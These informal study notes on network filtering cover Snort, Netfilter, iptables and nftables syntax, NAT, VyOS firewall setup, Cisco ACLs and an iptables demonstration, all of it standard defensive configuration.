sudo snort -r <pcap to read> -c /etc/snort/snort.conf to check if a pcap has any alerts

============================ FILTERING DEVICES & MECHANISMS ====================================

WHAT ARE SOME PRACTICAL APPLICATIONS OF FILTERING?
For example, we can filter website access on a network via a web proxy server to ensure only approved websites and content are allowed in and out of a network.

PRACTICAL APPLICATIONS FOR FILTERING
Email addresses - to block unwanted email and increase productivity
Computer applications in an organization environment - for security from vulnerable software
MAC filtering - also for security to allow only specific computers access to a network
Network Traffic

WHY DOES NETWORK TRAFFIC GET FILTERED?

WHY FILTER NETWORK TRAFFIC?
Decrease load on network infrastructure
Ensure data flows in an efficient manner
Ensure data gets to intended recipients and only intended recipients
Block malicious traffic
Obfuscate network internals

WHAT DEVICES ARE USED TO FILTER TRAFFIC?
What mechanisms do they use?
What OSI layer do they operate at?

FILTERING CONCEPTS
Whitelist vs Blacklist
Default policies and Implicit and Explicit rules
Network Device Operation Modes
Routed
Transparent

FILTERING CONCEPTS
Intrusion Defense
Intrusion Detection Systems
Intrusion Prevention Systems
Filtering Device Placement
Firewall Filtering Methods
Stateless (Packet) Filtering (L3+4)
Stateful Inspection (L4)
Application Layer (L7)

TRAFFIC DIRECTIONS
Traffic originating from the localhost to the remote-host
Return traffic from that remote-host back to the localhost.
Traffic originating from the remote-host to the localhost
Return traffic from the localhost back to the remote-host.

WINDOWS OR LINUX
What can Windows use?
What can Linux use?

NETFILTER FRAMEWORK
Made to provide:
packet filtering
stateless/stateful Firewalls
network address and port translation (NAT and PAT)
other packet manipulation

NETFILTER HOOKS
NF_IP_PRE_ROUTING → PREROUTING
NF_IP_LOCAL_IN → INPUT
NF_IP_FORWARD → FORWARD
NF_IP_LOCAL_OUT → OUTPUT
NF_IP_POST_ROUTING → POSTROUTING

NETFILTER PARADIGM
tables - contain chains
chains - contain rules
rules - dictate what to match and what actions to perform on packets when packets match a rule

CONFIGURING IPTABLES

SEPARATE APPLICATIONS
Netfilter created several (separate) applications to filter on different layer 2 or layer 3+ protocols.
iptables - IPv4 packet administration
ip6tables - IPv6 packet administration
ebtables - Ethernet Bridge frame table administration
arptables - arp packet administration

EACH APPLICATION HAD SEVERAL TABLES AND CHAINS
filter - default table. Provides packet filtering.
INPUT, FORWARD, and OUTPUT
nat - used to translate private ←→ public address and ports.
PREROUTING, POSTROUTING, and OUTPUT
mangle - provides special packet alteration. Can modify various fields header fields.
All Chains: PREROUTING, POSTROUTING, INPUT, FORWARD and OUTPUT.
raw - used to configure exemptions from connection tracking.
PREROUTING and OUTPUT
security - used for Mandatory Access Control (MAC) networking rules.
INPUT, FORWARD, and OUTPUT

IPTABLES SYNTAX
iptables -t [table] -A [chain] [rules] -j [action]
Rules:

-i or -o [iface]
-s or -d [ip.add | network/mask]
-p [protocol(in ipv4 header)]
-m is used with:
  state --state [state]
  mac [--mac-source | --mac-destination] [mac]
  tcp | udp [--dport | --sport] [port | port1:port2]
  multiport [--sports | --dports | --ports]
                [port1,[port2,[port3:port15]]]
  bpf --bytecode [ 'bytecode' ]
[action] - ACCEPT, REJECT, DROP

MODIFY IPTABLES
Flush table
iptables -t [table] -F
Change default policy
iptables -t [table] -P [chain] [action]
Lists rules with rule numbers
iptables -t [table] -L --line-numbers
Lists rules as commands interpreted by the system
iptables -t [table] -S
Inserts rule before Rule number
iptables -t [table] -I [chain] [rule num] [rules] -j [action]
Deletes rule at number
iptables -t [table] -D [chain] [rule num]

CONFIGURING NFTABLES

NFTABLE FAMILIES
ip - IPv4 packets
ip6 - IPv6 packets
inet - IPv4 and IPv6 packets
arp - layer 2
bridge - processing traffic/packets traversing bridges.
netdev - allows for user classification of packets - nftables passes up to the networking stack
(no counterpart in iptables)

INTRODUCES CHAIN-TYPES
There are three chain types:
filter - to filter packets - can be used with arp, bridge, ip, ip6, and inet families
route - to reroute packets - can be used with ip and ipv6 families only
nat - used for Network Address Translation - used with ip and ip6 table families only

CREATION OF HOOKS
PREROUTING
POSTROUTING
INPUT
OUTPUT
FORWARD
INGRESS - used with NETDEV family only

NFTABLE ENHANCEMENTS
one table command to replace multiple
simpler, cleaner syntax
less code duplication
simultaneous configuration of IPv4 and IPv6

1. CREATE THE TABLE
nft add table [family] [table]
[family] = ip, ip6, inet, arp, bridge and netdev.
[table] = user provided name for the table.

2. CREATE THE BASE CHAIN
nft add chain [family] [table] [chain] { type [type] hook [hook]
    priority [priority] \; policy [policy] \;}
[chain] = User defined name for the chain.
[type] =  can be filter, route or nat.
[hook] = prerouting, ingress, input, forward, output or
         postrouting.
[priority] = user provided integer. Lower number = higher
             priority. default = 0. Use "--" before
             negative numbers.
; [policy] ; = set policy for the chain. Can be
              accept (default) or drop.
 Use "\" to escape the ";" in bash

3. CREATE A RULE IN THE CHAIN
nft add rule [family] [table] [chain] [matches (matches)] [statement]
[matches] = typically protocol headers(i.e. ip, ip6, tcp,
            udp, icmp, ether, etc)
(matches) = these are specific to the [matches] field.
[statement] = action performed when packet is matched. Some
              examples are: log, accept, drop, reject,
              counter, nat (dnat, snat, masquerade)

MODIFY NFTABLES
nft {list | flush} ruleset
nft {delete | list | flush } table [family] [table]
nft {delete | list | flush } chain [family] [table] [chain]

MODIFY NFTABLES
nft list table [family] [table] [-a]
Adds after position
nft add rule [family] [table] [chain] [position <position>] [matches (matches)] [statement]
Inserts before position
nft insert rule [family] [table] [chain] [position <position>] [matches (matches)] [statement]
Replaces rule at handle
nft replace rule [family] [table] [chain] [handle <handle>] [matches (matches)] [statement]
Deletes rule at handle
nft delete rule [family] [table] [chain] [handle <handle>]

NAT AND PAT W/ NFTABLES
Create the NAT table
nft add table ip NAT
Create the NAT chains
nft add chain ip NAT PREROUTING {type nat hook prerouting priority 0 \; }
nft add chain ip NAT POSTROUTING {type nat hook postrouting priority 100 \; }

CREATE THE NAT RULES
Source NAT
nft add rule ip NAT POSTROUTING ip saddr 10.1.0.2 oif eth0 snat 144.15.60.11
Destination NAT
nft add rule ip NAT PREROUTING iif eth0 tcp dport { 80, 443 } dnat 10.1.0.3
Source NAT w/ masquerade
nft add rule ip NAT POSTROUTING ip saddr 10.1.0.0/24 oif eth0 masquerade
Destination NAT (port forwarding) with redirect
nft add rule ip NAT PREROUTING tcp dport 80 redirect to 8080

USING VYOS AS A NETWORK FIREWALL
VYOS is a Linux-based freeware operating system based on Debian with a built-in network operating system much like Juniper. It has vast router features such as:
Routing (RIP, OSPF, static)
Network interfaces (Ethernet, VLANS, wireless, etc)
Firewall and NAT (netfilter)
VPN
Network services (DHCP, DNS services, QOS)
High availability (VRRP and load balancing)
IPv6 support
System maintenance and monitoring (SNMP, syslog, etc)
HOW IT’S DIFFERENT FROM OTHER ROUTER DISTROS?
Unified command line interface in the style of hardware routers.
Scriptable CLI
Stateful configuration system
Image-based upgrade
Not just firewall and VPN but routing as well
Runs on physical and virtual platforms alike
Completely free and open source
Community driven

BASIC COMMANDS
Navigate to configuration mode:
vyos@router1:~$ configure
[edit]
vyos@router1#
Navigate back to user mode:
vyos@router1# exit
exit
vyos@router1:~$
to view the current router configuration:
vyos@router1:~$ show configuration

COMMAND SYNTAX HELP
{show ?} - will show a list of available commands
{tab} - to complete a command
{?} - identifies the next set of arguments you can use for the current command syntax
{set} to add statement and {delete} to remove statement
{commit} - save the configurations to the running configuration
{save} - save configuration to the startup configuration

CONFIGURATION EXAMPLES
Configure an interface
set interfaces ethernet eth1 address '192.168.0.1/24'
set interfaces ethernet eth1 description 'INSIDE'
Configure a static route
set protocols static route 0.0.0.0/0 next-hop 172.16.0.254 distance '1'
Configure RIP
set interfaces loopback address 1.1.1.1/32
set protocols rip network 10.1.0.0/24
set protocols rip redistribute connected
Configure Firewall
set firewall name INSIDE-OUT default-action drop
set firewall name INSIDE-OUT rule 1010 action accept
set firewall name INSIDE-OUT rule 1010 state established enable
set firewall name INSIDE-OUT rule 1020 action drop
set firewall name INSIDE-OUT rule 1020 state invalid enable
Apply Firewall
set interfaces ethernet eth1 firewall in name INSIDE-OUT

ROUTER AS A FILTER

ACL CREATION
Demo> enable #enter privileged exec mode
Demo# configure terminal #enter global config mode
Demo(config)# access-list 37 ... (output omitted) ...
Demo(config)# ip access-list standard block_echo_request
Demo(config)# access-list 123  ... (output omitted) ...
Demo(config)# ip access-list extended zone_transfers
What types of ACLs were created?

STANDARD NUMBERED ACL SYNTAX
router(config)# access-list {1-99 | 1300-1999}  {permit|deny}  {source IP add}
                {source wildcard mask}
router(config)#  access-list 10 permit host 10.0.0.1
router(config)#  access-list 10 deny 10.0.0.0 0.255.255.255
router(config)#  access-list 10 permit any

STANDARD NAMED ACL SYNTAX
router(config)# ip access-list standard [name]
router(config-std-nacl)# {permit | deny}  {source ip add}  {source wildcard mask}
router(config)#  ip access-list standard CCTC-STD
router(config-std-nacl)#  permit host 10.0.0.1
router(config-std-nacl)#  deny 10.0.0.0 0.255.255.255
router(config-std-nacl)#  permit any

EXTENDED NUMBERED ACL SYNTAX
router(config)# access-list {100-199 | 2000-2699} {permit | deny} {protocol}
                {source IP add & wildcard} {operand: eq|lt|gt|neq}
                {port# |protocol} {dest IP add & wildcard} {operand: eq|lt|gt|neq}
                {port# |protocol}
router(config)# access-list 144 permit tcp host 10.0.0.1 any eq 22
router(config)# access-list 144 deny tcp 10.0.0.0 0.255.255.255 any eq telnet
router(config)# access-list 144 permit icmp 10.0.0.0 0.255.255.255 192.168.0.0
                0.0.255.255 echo
router(config)# access-list 144 deny icmp 10.0.0.0 0.255.255.255 192.168.0.0
                0.0.255.255 echo-reply
router(config)# access-list 144 permit ip any any

EXTENDED NAMED ACL SYNTAX
router(config)# ip access-list extended  [name]
router(config-ext-nacl)# [sequence number] {permit | deny} {protocol}
                         {source IP add & wildcard} {operand: eq|lt|gt|neq}
                         {port# |protocol} {dest IP add & wildcard} {operand:
                         eq|lt|gt|neq} {port# |protocol}
router(config)# ip access-list extended CCTC-EXT
router(config-ext-nacl)# permit tcp host 10.0.0.1 any eq 22
router(config-ext-nacl)# deny tcp 10.0.0.0 0.255.255.255 any eq telnet
router(config-ext-nacl)# permit icmp 10.0.0.0 0.255.255.255 192.168.0.0
                         0.0.255.255 echo
router(config-ext-nacl)# deny icmp 10.0.0.0 0.255.255.255 192.168.0.0
                         0.0.255.255 echo-reply
router(config-ext-nacl)# permit ip any any

APPLY AN ACL TO AN INTERFACE OR LINE
router(config)#  interface {type} {mod/slot/port}
router(config)#  ip access-group {ACL# | name} {in | out}
router(config)#  interface s0/0/0
router(config-if)#  ip access-group 10 out
router(config)#  interface g0/1/1
router(config-if)#  ip access-group CCTC-EXT in
router(config)#  line vty 0 15
router(config)#  access-class CCTC-STD in

ACL PLACEMENT 3
Interpret this ACL:
ip access-list 101 deny udp host 19.3.0.29 10.5.0.0 0.0.0.255 eq 69
ip access-list 101 deny tcp any 10.3.0.0 0.0.0.255 eq 22
ip access-list 101 deny tcp any 10.1.0.0 0.0.0.255 eq 23
ip access-list 101 deny icmp any 10.5.0.0 0.0.0.255 echo
ip access-list 101 deny icmp any 10.5.0.0 0.0.0.255 echo-reply
What Type of list is this?
What would it do?
Where should it be placed (use diagram on previous slide)?
What direction?

IPTABLES / NFTABLES DEMONSTRATION

sudo iptables -L to view the iptable chains (default table)
sudo iptables -t nat -L to view the iptables NAT table chais
sudo iptables -F flushs the iptable default ip table unless a -t is used to specify another table
* DO NOT FLUSH UNTIL DEFAULT POLICY IS SET TO IMPLICIT ALLOW IN ORDER TO STILL ALLOW YOURSELF TO SSH *

sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT create a rule on the INPUT chain with the protocol tcp to destination port 22 and have it ACCEPT said traffic (also do a --sport 22 to accept all ssh inputs)
sudo iptables -P INPUT DROP sets the INPUT policy to drop which disables X11 which is what terminator uses
sudo iptables -A INPUT -p tcp -m multiport --(s or d or neither for both)ports 22,6010,6011,6012 -m state --state NEW,ESTABLSIHED -j ACCEPT creates a rule in the default INPUT chain for multiple tcp ports when its a new or established connection 
* MAKE SURE TO MAKE CHANGES TO BOTH INPUT AND OUTPUT CHAINS TO ACCOUNT FOR TRAFFIC MOVING IN AND OUT *

sudo iptables -L --line shows the line numbers for the specific chain rules
sudo iptables -D OUTPUT 4 deletes the line 4 chain rule in the OUTPUT chain

sudo iptables -I INPUT -s 172.16.82.106 -j DROP (also do for output as the destination ip) the -I puts the rule at the top of the chain and doesn't allow traffic coming from 172.16.82.106 to go through the firewall
* -A puts the rule at the end of the chain while -I puts the rule at the top *







